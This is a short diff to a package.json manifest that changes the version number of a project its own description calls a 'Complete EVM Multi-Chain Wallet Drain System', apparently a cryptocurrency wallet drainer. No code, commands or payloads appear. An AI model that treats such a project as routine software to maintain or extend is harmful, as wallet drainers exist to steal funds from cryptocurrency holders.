@@ -1,6 +1,6 @@
 {
   "name": "bitcoin-hyper-multichain-drain",
-  "version": "13.0.0",
+  "version": "14.0.0",
   "description": "Complete EVM Multi-Chain Wallet Drain System",
   "main": "index.js",
   "type": "commonjs",
